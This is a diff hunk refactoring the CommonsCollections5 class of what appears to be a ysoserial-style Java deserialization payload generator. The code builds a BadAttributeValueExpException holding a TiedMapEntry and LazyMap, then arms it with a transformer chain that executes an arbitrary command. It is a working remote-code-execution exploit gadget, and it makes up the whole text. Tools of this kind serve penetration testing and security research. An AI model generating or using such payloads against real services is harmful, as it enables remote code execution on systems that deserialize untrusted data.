@@ -54,19 +54,12 @@ public class CommonsCollections5 implements ObjectPayload<BadAttributeValueExpEx
 		final Transformer transformerChain = new ChainedTransformer(
 				new Transformer[]{new ConstantTransformer(1)});
 		// real chain for after setup
-		final Transformer[] transformers = TransformerUtil.makeTransformer(command);
-
-		final Map innerMap = new HashMap();
-
-		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-		TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
-
-		BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
-		Field                         valfield = val.getClass().getDeclaredField("val");
-		Reflections.setAccessible(valfield);
-		valfield.set(val, entry);
-
+		final Transformer[]           transformers = TransformerUtil.makeTransformer(command);
+		final Map                     innerMap     = new HashMap();
+		final Map                     lazyMap      = LazyMap.decorate(innerMap, transformerChain);
+		TiedMapEntry                  entry        = new TiedMapEntry(lazyMap, "su18");
+		BadAttributeValueExpException val          = new BadAttributeValueExpException(null);
+		Reflections.setFieldValue(val, "val", entry);
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
 		return val;
